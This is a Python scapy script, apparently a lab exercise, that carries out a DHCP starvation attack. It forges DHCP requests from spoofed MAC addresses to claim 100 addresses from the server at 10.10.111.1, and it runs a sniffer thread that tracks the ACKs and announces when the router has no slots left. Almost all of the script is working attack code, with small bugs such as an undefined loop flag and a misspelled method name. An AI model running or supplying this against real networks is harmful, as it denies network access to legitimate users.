from scapy.all import *
from threading import Thread, Event
import time


class Sniffer(Thread):
	def __init__(self):
		super(Sniffer, self).__init__()
		self.domains = dict()
		self.number_of_domains = 0
		self.stop_sniffer= Event()
		run = True


	def run(self):
		print "Start Sniffing... \n"
		sniff(filter = "port 68" , prn = self.analyze_packet , stop_filter=self.sinffer_run, store = 0)

	def analyze_packet(self, pkt):
		ACK = pkt[DHCP].options[0][1]
		if pkt[IP].src == "10.10.111.1" and ACK == 5:
			domain_name = pkt[BOOTP].chaddr #Last 3 numbers are also the last 3 IP digits
			self.domains[domain_name[3:]] = True
			print "10.10.111."+domain_name[3:]+ " is now registerd in the DHCP server"
			number_of_domains = len(self.domains)
			if number_of_domains == 100: #stops the sniffer
				self.stop_sniffer.set()
				Sniffer.run = False
				print "Job is done. No more DHCP slots left in the router"
				for key in self.domains:
					print "10.10.111."+key+" - ",



	def sinffer_run(self,pkt):
		return self.stop_sniffer.isSet()

thread = Sniffer()
thread.start()

while Sniffer.run:
	for domain in range(100,201):
		domain = str(domain)
		fake_mac_ether = "f0:18:98:f4:0" + domain[0] + ":" + domain[1:]
		req_ip = "10.10.111."+domain

		#Build DHCP Request
		ethernet = Ether(dst = "ff:ff:ff:ff:ff:ff", src = fake_mac_ether)
		ip = IP(src = "0.0.0.0", dst = "255.255.255.255")
		udp = UDP(sport = 68 , dport = 67)
		bootp = BOOTP(chaddr = "MZ-"+domain , flags = 0x8000)
		dhcp = DHCP(options = [("message-type", "request"), ("hostname", "Meir-010"), ("server_id", "10.10.111.1"), ("lease_time", 86400), ("requested_addr", req_ip), "end"])

		#Build packet to send
		req_packet = ethernet / ip / udp / bootp / dhcp
		#Send DHCP Request
		sendp(req_packet)
		time.sleep(0.1) #sleep for 100 milliseconds
		if  Sniffer.run == False:
			break


